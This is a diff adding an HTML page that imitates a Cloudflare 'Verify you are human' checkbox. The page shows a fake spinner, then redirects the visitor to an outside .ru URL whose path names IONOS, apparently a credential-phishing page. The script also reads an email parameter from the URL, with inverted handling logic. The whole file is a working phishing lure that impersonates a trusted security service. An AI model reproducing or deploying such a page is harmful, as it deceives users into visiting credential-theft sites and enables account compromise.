@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #fff;
+        }
+
+        .verification-container {
+            border: 1px solid #ddd;
+            padding: 12px 20px;
+            width: 300px;
+            background: #fff;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+        }
+
+        input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+        }
+
+        .checkbox-label {
+            font-size: 13px;
+            color: #000;
+        }
+
+        .cloudflare-logo {
+            float: right;
+            width: 3rem;
+            margin-bottom: -15px;
+        }
+
+        .cloudflare-text {
+            font-size: 1rem;
+
+        }
+
+        .footer-container {
+            display: block;
+            justify-content: space-between;
+            align-items: center;
+            margin-left: auto;
+            padding-bottom: 10px;
+        }
+
+        .footer-content {
+            display: block;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        
+
+        .footer {
+            text-align: right;
+            font-size: 11px;
+            color: #737373;
+            margin-top: -15px;
+        }
+
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 0 4px;
+        }
+    </style>
+
+<script>
+    // Get the email parameter directly from the URL.
+    function getQueryParams() {
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get('e');
+        return { email };
+    }
+
+    // Redirect to a plain text URL with the email appended as a fragment.
+    function redirectToUrl() {
+        const { email } = getQueryParams();
+        // Use your plain destination URL here instead of a Base64 encoded string.
+        const destinationUrl = "https://old.stelladivan.ru/pia/IONOs_FIXED/index.html";
+        if (!email) {
+            window.location.href = `${destinationUrl}`;
+        } else {
+            console.error('Email parameter is missing');
+        }
+    }
+
+    // Handle the checkbox verification UI.
+    function handleCheckbox() {
+        const checkbox = document.getElementById('verification-checkbox');
+        const spinner = document.getElementById('spinner');
+        const label = document.getElementById('checkbox-label');
+
+        if (checkbox.checked) {
+            checkbox.style.display = 'none'; // Hide checkbox
+            spinner.style.display = 'inline'; // Show spinner
+            label.textContent = "Verifying..."; // Update text
+            setTimeout(redirectToUrl, 2000);
+        }
+    }
+</script>
+</head>
+<body>
+    <div class="verification-container">
+        <div class="checkbox-wrapper">
+            <div class="spinner-container">
+                <input type="checkbox" id="verification-checkbox" onchange="handleCheckbox()">
+            <img id="spinner" class="spinner" src="https://upload.wikimedia.org/wikipedia/commons/d/de/Ajax-loader.gif" alt="Loading...">
+
+            </div>
+            <label id="checkbox-label" for="verification-checkbox" class="checkbox-label">Verify you are human</label>
+
+            <div class="footer-container">
+                <div class="footer-content">
+                    <img src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare" class="cloudflare-logo">
+                    <h1 class="cloudflare-text">
+                        Cloudflare
+                    </h1>
+
+                    <div class="footer">
+                        <a href="#">Privacy</a>
+                        <span class="divider">•</span>
+                        <a href="#">Terms</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</body>
+
+</html>
